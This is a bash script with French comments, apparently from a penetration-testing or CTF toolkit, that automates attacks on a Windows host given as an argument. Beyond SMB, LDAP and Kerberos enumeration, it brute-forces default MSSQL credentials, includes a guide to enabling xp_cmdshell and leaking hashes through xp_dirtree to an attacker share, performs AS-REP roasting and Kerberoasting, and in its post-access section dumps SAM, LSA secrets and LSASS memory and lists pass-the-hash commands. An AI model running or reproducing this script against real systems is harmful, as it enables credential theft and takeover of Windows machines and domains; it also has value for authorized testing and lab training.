#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║   Auto-Enum — WINDOWS MACHINE                               ║
# ║   Usage: ./enum_windows.sh <TARGET> [USER] [PASS] [DOMAIN] [HASH]
# ║   Ex:    ./enum_windows.sh 10.10.10.10                      ║
# ║          ./enum_windows.sh 10.10.10.10 admin Password123    ║
# ║          ./enum_windows.sh 10.10.10.10 admin '' CORP aad3...:hash
# ╚══════════════════════════════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-}"
PASS="${3:-}"
DOMAIN="${4:-}"
HASH="${5:-}"   # NTLM hash (LM:NT format) pour PTH

require_target "$TARGET"
banner "WINDOWS FULL ENUM" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "windows")

# Outil nxc/crackmapexec
NXC=$(command -v nxc 2>/dev/null || command -v crackmapexec 2>/dev/null || echo "")
[[ -z "$NXC" ]] && warn "nxc/crackmapexec non trouvé — certaines sections ignorées"

# Args auth pour les outils qui l'acceptent
AUTH_NXC=""
AUTH_IMPACKET=""
if [[ -n "$USER" && -n "$HASH" ]]; then
    AUTH_NXC="-u $USER -H $HASH"
    AUTH_IMPACKET="${DOMAIN:+$DOMAIN/}${USER}@${TARGET} -hashes $HASH"
elif [[ -n "$USER" && -n "$PASS" ]]; then
    AUTH_NXC="-u $USER -p $PASS"
    AUTH_IMPACKET="${DOMAIN:+$DOMAIN/}${USER}:${PASS}@${TARGET}"
fi

# ─── 1. FINGERPRINT ────────────────────────────────────────────
section "1. FINGERPRINT WINDOWS"

# nxc fingerprint (OS, hostname, domaine, SMB signing)
if [[ -n "$NXC" ]]; then
    info "nxc — fingerprint SMB"
    cmd "$NXC smb $TARGET"
    $NXC smb "$TARGET" 2>&1 | tee "$OUTDIR/nxc_fingerprint.txt"

    OS=$(grep -oP 'Windows\s+\S+.*?(?=\s+x\d{2})' "$OUTDIR/nxc_fingerprint.txt" 2>/dev/null | head -1)
    HOSTNAME=$(grep -oP '\(name:\K[^)]+' "$OUTDIR/nxc_fingerprint.txt" 2>/dev/null | head -1)
    WDOMAIN=$(grep -oP '\(domain:\K[^)]+' "$OUTDIR/nxc_fingerprint.txt" 2>/dev/null | head -1)
    SIGNING=$(grep -oP '\(signing:\K[^)]+' "$OUTDIR/nxc_fingerprint.txt" 2>/dev/null | head -1)

    [[ -n "$OS" ]] && finding "OS : $OS"
    [[ -n "$HOSTNAME" ]] && finding "Hostname : $HOSTNAME"
    [[ -n "$WDOMAIN" && -z "$DOMAIN" ]] && { DOMAIN="$WDOMAIN"; finding "Domaine : $DOMAIN"; }
    [[ "$SIGNING" == "False" ]] && {
        warn "SMB Signing DÉSACTIVÉ → éligible au SMB Relay !"
        echo "SMB_RELAY_ELIGIBLE:$TARGET" >> "$OUTDIR/findings.txt"
    }
fi

# Nmap — fingerprint OS + scripts
info "Nmap — SMB, RDP, WinRM fingerprint"
run "Nmap fingerprint" "$OUTDIR/nmap_fingerprint.txt" \
    nmap -p 135,139,445,3389,5985,5986 \
    --script smb-security-mode,smb2-security-mode,smb-os-discovery,smb-protocols,rdp-enum-encryption \
    -sV -oN "$OUTDIR/nmap_fingerprint_raw.txt" \
    "$TARGET"

# ─── 2. SMB (445) ──────────────────────────────────────────────
section "2. SMB (445)"

# Null session / guest
info "Test null session"
if [[ -n "$NXC" ]]; then
    $NXC smb "$TARGET" -u '' -p '' --shares 2>&1 | tee "$OUTDIR/smb_null.txt"
    $NXC smb "$TARGET" -u 'guest' -p '' --shares 2>&1 | tee "$OUTDIR/smb_guest.txt"
fi

info "smbclient — listing shares (null)"
smbclient -L "//$TARGET" -N 2>&1 | tee "$OUTDIR/smb_shares_null.txt"

# RID bruteforce (enum users sans creds)
if [[ -n "$NXC" ]]; then
    info "RID brute — enum users"
    $NXC smb "$TARGET" -u '' -p '' --rid-brute 2>&1 | tee "$OUTDIR/smb_rid_brute.txt"
    $NXC smb "$TARGET" -u 'guest' -p '' --rid-brute 2>&1 >> "$OUTDIR/smb_rid_brute.txt"
    grep -i "SidTypeUser" "$OUTDIR/smb_rid_brute.txt" 2>/dev/null | \
        grep -oP '\d+\s+\K\S+\\S+' | tee "$OUTDIR/smb_users.txt"
fi

# Password policy (avant spray)
if [[ -n "$NXC" ]]; then
    info "Password policy (avant tout spray)"
    $NXC smb "$TARGET" -u '' -p '' --pass-pol 2>&1 | tee "$OUTDIR/smb_pass_pol.txt"
fi

# Avec creds si fournis
if [[ -n "$USER" ]]; then
    info "Enum SMB authentifié"
    if [[ -n "$NXC" ]]; then
        $NXC smb "$TARGET" $AUTH_NXC --shares 2>&1 | tee "$OUTDIR/smb_auth_shares.txt"
        $NXC smb "$TARGET" $AUTH_NXC --users 2>&1 | tee "$OUTDIR/smb_auth_users.txt"
        $NXC smb "$TARGET" $AUTH_NXC --groups 2>&1 | tee "$OUTDIR/smb_auth_groups.txt"

        # Vérifier si admin
        if grep -q "Pwn3d!" "$OUTDIR/smb_auth_shares.txt" 2>/dev/null; then
            success "ADMIN LOCAL CONFIRMÉ (Pwn3d!)"
            finding "SMB_ADMIN:$USER" >> "$OUTDIR/findings.txt"
            echo "SMB_ADMIN:$USER" >> "$OUTDIR/valid_creds.txt"
        fi
    fi

    # Spider share (récupérer tous les fichiers texte/config)
    info "Spider shares — recherche de fichiers sensibles"
    smbclient "//$TARGET/C$" ${PASS:+-U $USER%$PASS} -c "recurse on; prompt off; ls" 2>/dev/null | \
        grep -iE "\.txt|\.xml|\.cfg|\.ini|\.bat|\.ps1|\.config|password|cred|secret" | \
        head -30 | tee "$OUTDIR/smb_interesting_files.txt"
fi

# Vulnérabilités SMB (nmap uniquement — pas nxc modules à cause des faux positifs)
info "Nmap — vérification EternalBlue (MS17-010)"
run "Nmap MS17-010" "$OUTDIR/nmap_ms17010.txt" \
    nmap -p445 --script smb-vuln-ms17-010 "$TARGET"
if grep -qi "VULNERABLE\|State: VULNERABLE" "$OUTDIR/nmap_ms17010.txt" 2>/dev/null; then
    finding "VULNERABLE à EternalBlue (MS17-010) !"
    echo "MS17-010" >> "$OUTDIR/findings.txt"
fi

info "Nmap — MS08-067"
nmap -p445 --script smb-vuln-ms08-067 "$TARGET" 2>/dev/null | \
    tee "$OUTDIR/nmap_ms08067.txt" | grep -i "VULNERABLE" && \
    { finding "VULNERABLE à MS08-067 !"; echo "MS08-067" >> "$OUTDIR/findings.txt"; }

# ─── 3. WinRM (5985/5986) ──────────────────────────────────────
section "3. WinRM (5985/5986)"

# Test connectivité
info "Test WinRM"
nc -w 3 "$TARGET" 5985 </dev/null 2>/dev/null && \
    { success "WinRM port 5985 ouvert"; echo "WINRM_OPEN:5985" >> "$OUTDIR/findings.txt"; } || \
    info "Port 5985 fermé"
nc -w 3 "$TARGET" 5986 </dev/null 2>/dev/null && \
    { success "WinRM port 5986 ouvert (HTTPS)"; echo "WINRM_OPEN:5986" >> "$OUTDIR/findings.txt"; }

if [[ -n "$USER" && -n "$NXC" ]]; then
    info "nxc — test WinRM avec creds"
    $NXC winrm "$TARGET" $AUTH_NXC 2>&1 | tee "$OUTDIR/winrm_test.txt"
    grep -q "Pwn3d!" "$OUTDIR/winrm_test.txt" 2>/dev/null && {
        success "WinRM PWNED → evil-winrm -i $TARGET -u $USER ${PASS:+-p $PASS}${HASH:+-H $HASH}"
        echo "WINRM_PWNED:$USER" >> "$OUTDIR/findings.txt"
        echo "WINRM_PWNED:$USER" >> "$OUTDIR/valid_creds.txt"
    }
fi

# Guide evil-winrm
cat >> "$OUTDIR/winrm_connect_guide.txt" << EOF
# Connexion WinRM
evil-winrm -i $TARGET -u $USER -p $PASS
evil-winrm -i $TARGET -u $USER -H $HASH    # Pass-the-Hash
evil-winrm -i $TARGET -u $USER -p $PASS -S  # HTTPS (5986)

# nxc WinRM
$NXC winrm $TARGET -u $USER -p $PASS --exec whoami
EOF

# ─── 4. RDP (3389) ─────────────────────────────────────────────
section "4. RDP (3389)"

info "Nmap — RDP check (BlueKeep MS12-020, NLA)"
run "Nmap RDP" "$OUTDIR/nmap_rdp.txt" \
    nmap -p3389 \
    --script rdp-vuln-ms12-020,rdp-enum-encryption \
    -sV "$TARGET"

if grep -qi "VULNERABLE\|MS12-020" "$OUTDIR/nmap_rdp.txt" 2>/dev/null; then
    finding "VULNERABLE à MS12-020 (DoS) !"
    echo "MS12-020" >> "$OUTDIR/findings.txt"
fi

NLA=$(grep -i "NLA\|Network Level\|CredSSP" "$OUTDIR/nmap_rdp.txt" 2>/dev/null | head -1)
[[ -n "$NLA" ]] && info "NLA : $NLA"

# Screenshot RDP (si nxc disponible)
if [[ -n "$NXC" ]]; then
    info "nxc — screenshot RDP"
    $NXC rdp "$TARGET" --screenshot --screentime 3 2>&1 | \
        tee "$OUTDIR/rdp_screenshot_info.txt"
fi

# Connexion guide
cat >> "$OUTDIR/rdp_connect_guide.txt" << EOF
# Connexion RDP
xfreerdp /v:$TARGET /u:$USER /p:$PASS /cert:ignore +clipboard /dynamic-resolution
xfreerdp /v:$TARGET /u:$USER /pth:$HASH /cert:ignore   # Pass-the-Hash

# BlueKeep (CVE-2019-0708) check
nmap -p3389 --script rdp-vuln-ms12-020 $TARGET
EOF

# ─── 5. MSSQL (1433) ───────────────────────────────────────────
section "5. MSSQL (1433)"

# Test connectivité
nc -w 3 "$TARGET" 1433 </dev/null 2>/dev/null || { info "Port 1433 fermé — section ignorée"; }

info "Nmap — MSSQL fingerprint"
nmap -p1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password "$TARGET" 2>/dev/null | \
    tee "$OUTDIR/nmap_mssql.txt"

# Default creds
if command -v impacket-mssqlclient &>/dev/null || python3 -c "import impacket" 2>/dev/null; then
    MSSQL_CLIENT=$(command -v impacket-mssqlclient 2>/dev/null || echo "python3 -m impacket.examples.mssqlclient")
    info "Test default creds MSSQL"
    for CRED in "sa:" "sa:sa" "sa:Password1" "sa:password" "sa:admin" "sa:Sa"; do
        _u="${CRED%%:*}"; _p="${CRED##*:}"
        RESULT=$(timeout 5 $MSSQL_CLIENT "$_u:${_p}@${TARGET}" -windows-auth 2>&1 || true)
        if echo "$RESULT" | grep -qi "SQL.*>" ; then
            success "MSSQL : creds valides $_u:$_p (Windows auth)"
            finding "MSSQL_CREDS:$_u:$_p (windows-auth)"
            echo "MSSQL:$_u:$_p:windows-auth" >> "$OUTDIR/valid_creds.txt"
            break
        fi
        RESULT=$(timeout 5 $MSSQL_CLIENT "$_u:${_p}@${TARGET}" 2>&1 || true)
        if echo "$RESULT" | grep -qi "SQL.*>"; then
            success "MSSQL : creds valides $_u:$_p (SQL auth)"
            finding "MSSQL_CREDS:$_u:$_p (sql)"
            echo "MSSQL:$_u:$_p:sql" >> "$OUTDIR/valid_creds.txt"
            break
        fi
    done
fi

# Avec creds fournis
if [[ -n "$USER" ]]; then
    info "Test MSSQL avec creds fournis"
    if [[ -n "$NXC" ]]; then
        $NXC mssql "$TARGET" $AUTH_NXC 2>&1 | tee "$OUTDIR/mssql_auth.txt"
        grep -q "Pwn3d!" "$OUTDIR/mssql_auth.txt" 2>/dev/null && {
            success "MSSQL PWNED — xp_cmdshell possible !"
            echo "MSSQL_PWNED:$USER" >> "$OUTDIR/findings.txt"
        }
    fi
fi

cat >> "$OUTDIR/mssql_guide.txt" << 'EOF'
# Connexion MSSQL
impacket-mssqlclient sa:@TARGET
impacket-mssqlclient sa:sa@TARGET
impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth

# Dans mssqlclient :
SQL> SELECT @@version;
SQL> SELECT name FROM master.dbo.sysdatabases;
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'net user';

# Hash stealing (Responder doit tourner sur Kali)
SQL> EXEC xp_dirtree '\\KALI_IP\share';

# Serveurs liés
SQL> EXEC sp_linkedservers;
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
EOF

# ─── 6. IIS / WEB (80/443/8080) ────────────────────────────────
section "6. IIS / WEB"

for PORT_WEB in 80 443 8080 8443; do
    nc -w 2 "$TARGET" "$PORT_WEB" </dev/null 2>/dev/null || continue
    PROTO="http"; [[ "$PORT_WEB" == "443" || "$PORT_WEB" == "8443" ]] && PROTO="https"
    WEB_DIR="$OUTDIR/web_$PORT_WEB"; mkdir -p "$WEB_DIR"

    info "Web enum ${PROTO}://$TARGET:$PORT_WEB"

    # Headers
    curl -sIL --max-time 10 "${PROTO}://${TARGET}:${PORT_WEB}" 2>/dev/null | \
        tee "$WEB_DIR/headers.txt"

    # Whatweb
    check_tool whatweb && timeout 20 whatweb -a 3 "${PROTO}://${TARGET}:${PORT_WEB}" 2>&1 | \
        tee "$WEB_DIR/whatweb.txt"

    # robots.txt + sitemap
    curl -s --max-time 8 "${PROTO}://${TARGET}:${PORT_WEB}/robots.txt" 2>/dev/null | \
        grep -v "^#\|^$" | tee "$WEB_DIR/robots.txt"

    # DNN/DotNetNuke — web.config en clair
    for URL_CONFIG in "/web.config" "/Portals/0/web.config" "/DNN/web.config"; do
        RESULT=$(curl -s --max-time 8 "${PROTO}://${TARGET}:${PORT_WEB}${URL_CONFIG}" 2>/dev/null)
        if echo "$RESULT" | grep -qi "connectionString\|password=\|data source"; then
            success "web.config ACCESSIBLE : ${URL_CONFIG}"
            echo "$RESULT" | tee "$WEB_DIR/webconfig_$(echo "$URL_CONFIG" | tr '/' '_').txt"
            finding "WEB_CONFIG_EXPOSED:$PORT_WEB$URL_CONFIG"
            echo "WEB_CONFIG:$PORT_WEB:$URL_CONFIG" >> "$OUTDIR/findings.txt"
        fi
    done

    # WebDAV check
    WEBDAV=$(curl -s --max-time 8 -X OPTIONS "${PROTO}://${TARGET}:${PORT_WEB}" 2>/dev/null | \
        grep -i "PROPFIND\|PUT\|MOVE\|COPY")
    [[ -n "$WEBDAV" ]] && {
        warning "WebDAV activé !"
        echo "WEBDAV:$PORT_WEB" >> "$OUTDIR/findings.txt"
        echo "$WEBDAV" | tee "$WEB_DIR/webdav_methods.txt"
    }

    # SSL cert (subdomains)
    if [[ "$PROTO" == "https" ]]; then
        openssl s_client -connect "${TARGET}:${PORT_WEB}" 2>/dev/null </dev/null | \
            openssl x509 -noout -text 2>/dev/null | \
            grep -A 5 "Subject Alternative" | tee "$WEB_DIR/ssl_san.txt"
    fi

    # Directory fuzzing — extensions Windows
    WORDLIST="/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt"
    [[ ! -f "$WORDLIST" ]] && WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
    [[ ! -f "$WORDLIST" ]] && WORDLIST="/usr/share/wordlists/dirb/common.txt"

    if check_tool ffuf && [[ -f "$WORDLIST" ]]; then
        info "ffuf — fuzzing IIS (.aspx/.asp/.config)"
        run_long "ffuf $PORT_WEB" "$WEB_DIR/ffuf.txt" 60 \
            ffuf -u "${PROTO}://${TARGET}:${PORT_WEB}/FUZZ" \
            -w "$WORDLIST" \
            -e ".aspx,.asp,.html,.txt,.bak,.config,.zip" \
            -mc 200,201,301,302,403 -t 30 -s
    elif check_tool gobuster && [[ -f "$WORDLIST" ]]; then
        run_long "gobuster $PORT_WEB" "$WEB_DIR/gobuster.txt" 60 \
            gobuster dir -u "${PROTO}://${TARGET}:${PORT_WEB}" \
            -w "$WORDLIST" -x aspx,asp,html,txt,bak,config --no-error -q
    fi

    # Tomcat Manager (port 8080)
    if [[ "$PORT_WEB" == "8080" ]]; then
        TOMCAT=$(curl -s --max-time 8 "${PROTO}://${TARGET}:8080/manager/html" 2>/dev/null)
        if echo "$TOMCAT" | grep -qi "401\|manager"; then
            info "Tomcat Manager trouvé"
            echo "TOMCAT_MANAGER:8080" >> "$OUTDIR/findings.txt"
            cat >> "$WEB_DIR/tomcat_guide.txt" << 'EOF'
# Tomcat default creds à tester :
# admin:admin  admin:tomcat  tomcat:tomcat  tomcat:s3cret
# role1:role1  both:tomcat   manager:manager
# Via hydra : hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt TARGET http-get /manager/html
EOF
        fi
    fi
done

# ─── 7. RPC / WMI (135) ────────────────────────────────────────
section "7. RPC / WMI (135)"

info "rpcclient — null session"
echo "enumdomusers" | rpcclient -U "" -N "$TARGET" 2>&1 | tee "$OUTDIR/rpcclient_null.txt"
grep -oP "\[.*\]" "$OUTDIR/rpcclient_null.txt" 2>/dev/null | head -20 | tee "$OUTDIR/rpc_users.txt"

if [[ -n "$USER" ]]; then
    info "rpcclient — enum authentifié"
    {
        echo "enumdomusers"
        echo "enumdomgroups"
        echo "getdompwinfo"
        echo "querydominfo"
    } | rpcclient -U "${DOMAIN:+$DOMAIN/}$USER%$PASS" "$TARGET" 2>&1 | \
        tee "$OUTDIR/rpcclient_auth.txt"
fi

# impacket wmiquery si dispo
if command -v impacket-wmiquery &>/dev/null && [[ -n "$USER" ]]; then
    info "WMI — enum système"
    impacket-wmiquery "$AUTH_IMPACKET" -namespace root/cimv2 \
        -query "SELECT * FROM Win32_OperatingSystem" 2>/dev/null | \
        tee "$OUTDIR/wmi_os.txt"
fi

# ─── 8. LDAP (389/636) ─────────────────────────────────────────
section "8. LDAP / Active Directory"

nc -w 3 "$TARGET" 389 </dev/null 2>/dev/null || { info "Port 389 fermé — section LDAP ignorée"; }

# Anonymous bind
info "LDAP — anonymous bind"
BASE_DN=$(ldapsearch -x -H "ldap://$TARGET" -b "" -s base namingContexts 2>/dev/null | \
    grep "namingContexts:" | awk '{print $2}' | head -1)

if [[ -n "$BASE_DN" ]]; then
    finding "LDAP anonymous bind OK — Base DN : $BASE_DN"
    echo "LDAP_ANON_BIND:$BASE_DN" >> "$OUTDIR/findings.txt"
    [[ -z "$DOMAIN" ]] && DOMAIN=$(echo "$BASE_DN" | grep -oP "DC=\K[^,]+" | paste -sd '.')

    # Enum users anonyme
    ldapsearch -x -H "ldap://$TARGET" -b "$BASE_DN" \
        "(objectClass=user)" sAMAccountName userPrincipalName description 2>/dev/null | \
        grep -E "^sAMAccountName:|^description:" | tee "$OUTDIR/ldap_users_anon.txt"
else
    info "LDAP anonymous bind refusé"
fi

# Avec creds
if [[ -n "$USER" && -n "$BASE_DN" ]]; then
    info "LDAP — enum authentifié"
    ldapsearch -x -H "ldap://$TARGET" \
        -D "${DOMAIN:+$DOMAIN\\}$USER" -w "$PASS" \
        -b "$BASE_DN" "(objectClass=user)" sAMAccountName description 2>/dev/null | \
        tee "$OUTDIR/ldap_users_auth.txt"

    # nxc LDAP enum
    if [[ -n "$NXC" ]]; then
        $NXC ldap "$TARGET" $AUTH_NXC --users 2>&1 | tee "$OUTDIR/nxc_ldap_users.txt"
        $NXC ldap "$TARGET" $AUTH_NXC -M get-desc-users 2>&1 | \
            tee "$OUTDIR/nxc_ldap_desc.txt"
        grep -i "password\|pass\|pwd\|cred" "$OUTDIR/nxc_ldap_desc.txt" 2>/dev/null && \
            finding "PASSWORD TROUVÉ DANS UNE DESCRIPTION LDAP !"
    fi
fi

# ─── 9. KERBEROS (88) ──────────────────────────────────────────
section "9. KERBEROS (88)"

nc -w 3 "$TARGET" 88 </dev/null 2>/dev/null || { info "Port 88 fermé — section Kerberos ignorée"; }

if [[ -n "$DOMAIN" ]]; then
    # Enum users avec kerbrute
    if check_tool kerbrute; then
        USER_LIST="/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
        [[ ! -f "$USER_LIST" ]] && USER_LIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
        if [[ -f "$USER_LIST" ]]; then
            info "kerbrute — user enumeration"
            run_long "kerbrute" "$OUTDIR/kerbrute_users.txt" 60 \
                kerbrute userenum -d "$DOMAIN" --dc "$TARGET" \
                "$USER_LIST" 2>&1
            grep -i "VALID\|is valid" "$OUTDIR/kerbrute_users.txt" 2>/dev/null | \
                grep -oP "VALID USERNAME:\s*\K\S+" | tee "$OUTDIR/valid_users.txt"
        fi
    fi

    # AS-REP Roasting (users sans préauth)
    info "AS-REP Roasting — GetNPUsers"
    if command -v impacket-GetNPUsers &>/dev/null; then
        # Si on a des users valides
        if [[ -s "$OUTDIR/ldap_users_anon.txt" ]] || [[ -s "$OUTDIR/valid_users.txt" ]]; then
            USER_FILE="${OUTDIR}/valid_users.txt"
            [[ ! -s "$USER_FILE" ]] && USER_FILE="$OUTDIR/ldap_users_anon.txt"
            impacket-GetNPUsers "$DOMAIN/" \
                -dc-ip "$TARGET" \
                -usersfile "$USER_FILE" \
                -format hashcat -outputfile "$OUTDIR/asrep_hashes.txt" \
                -no-pass 2>&1 | tee "$OUTDIR/asrep_output.txt"
        else
            impacket-GetNPUsers "$DOMAIN/" \
                -dc-ip "$TARGET" -no-pass \
                -format hashcat -outputfile "$OUTDIR/asrep_hashes.txt" 2>&1 | \
                tee "$OUTDIR/asrep_output.txt"
        fi
        [[ -s "$OUTDIR/asrep_hashes.txt" ]] && {
            success "AS-REP Hashes trouvés !"
            finding "ASREP_ROASTING" >> "$OUTDIR/findings.txt"
            echo "ASREP_HASHES" >> "$OUTDIR/findings.txt"
            cat "$OUTDIR/asrep_hashes.txt"
            echo ""
            info "Cracker : hashcat -m 18200 $OUTDIR/asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
        }
    fi

    # Kerberoasting (si creds)
    if [[ -n "$USER" ]] && command -v impacket-GetUserSPNs &>/dev/null; then
        info "Kerberoasting — GetUserSPNs"
        impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" \
            -dc-ip "$TARGET" \
            -request -outputfile "$OUTDIR/kerb_hashes.txt" 2>&1 | \
            tee "$OUTDIR/kerberoast_output.txt"
        [[ -s "$OUTDIR/kerb_hashes.txt" ]] && {
            success "Kerberos TGS hashes trouvés !"
            echo "KERBEROAST_HASHES" >> "$OUTDIR/findings.txt"
            info "Cracker : hashcat -m 13100 $OUTDIR/kerb_hashes.txt /usr/share/wordlists/rockyou.txt"
        }
    fi
fi

# ─── 10. DUMP POST-ACCÈS (si admin) ────────────────────────────
if [[ -n "$USER" ]] && ( \
    grep -q "Pwn3d!" "$OUTDIR/smb_auth_shares.txt" 2>/dev/null || \
    grep -q "WINRM_PWNED\|MSSQL_PWNED" "$OUTDIR/findings.txt" 2>/dev/null ); then

    section "10. POST-ACCÈS — DUMP (admin local)"

    if [[ -n "$NXC" ]]; then
        info "Dump SAM (hashes locaux)"
        $NXC smb "$TARGET" $AUTH_NXC --sam 2>&1 | tee "$OUTDIR/dump_sam.txt"

        info "Dump LSA secrets"
        $NXC smb "$TARGET" $AUTH_NXC --lsa 2>&1 | tee "$OUTDIR/dump_lsa.txt"

        info "Dump LSASS via lsassy"
        $NXC smb "$TARGET" $AUTH_NXC -M lsassy 2>&1 | tee "$OUTDIR/dump_lsassy.txt"
    fi

    # Extraire les hashes NTLM
    grep -oP '\w+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' \
        "$OUTDIR/dump_sam.txt" "$OUTDIR/dump_lsassy.txt" 2>/dev/null | \
        sort -u | tee "$OUTDIR/hashes_ntlm.txt"
    HASH_COUNT=$(grep -c "." "$OUTDIR/hashes_ntlm.txt" 2>/dev/null || echo 0)
    [[ "$HASH_COUNT" -gt 0 ]] && {
        success "$HASH_COUNT hashes NTLM extraits !"
        info "Crack : hashcat -m 1000 $OUTDIR/hashes_ntlm.txt /usr/share/wordlists/rockyou.txt"
        info "PTH   : nxc smb $TARGET -u USER -H HASH"
    }

    # secretsdump impacket
    if command -v impacket-secretsdump &>/dev/null; then
        info "secretsdump — dump complet"
        impacket-secretsdump "${DOMAIN:+$DOMAIN/}${USER}:${PASS}@${TARGET}" \
            2>&1 | tee "$OUTDIR/secretsdump.txt"
    fi
fi

# ─── SUMMARY ───────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ WINDOWS ━━━${NC}"
[[ -f "$OUTDIR/nxc_fingerprint.txt" ]] && head -3 "$OUTDIR/nxc_fingerprint.txt"

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    echo ""
    success "CREDENTIALS VALIDES :"
    cat "$OUTDIR/valid_creds.txt"
}

[[ -s "$OUTDIR/hashes_ntlm.txt" ]] && {
    echo ""
    success "HASHES NTLM :"
    head -10 "$OUTDIR/hashes_ntlm.txt"
}

echo ""
info "Prochaines étapes :"
echo "  • BloodHound : bloodhound-python -u USER -p PASS -d $DOMAIN -dc $TARGET -c All --zip"
echo "  • Kerberoast : impacket-GetUserSPNs $DOMAIN/USER:PASS -dc-ip $TARGET -request"
echo "  • PTH SMB    : impacket-psexec $DOMAIN/USER@$TARGET -hashes :NTLMHASH"
echo "  • WinRM      : evil-winrm -i $TARGET -u USER -p PASS"
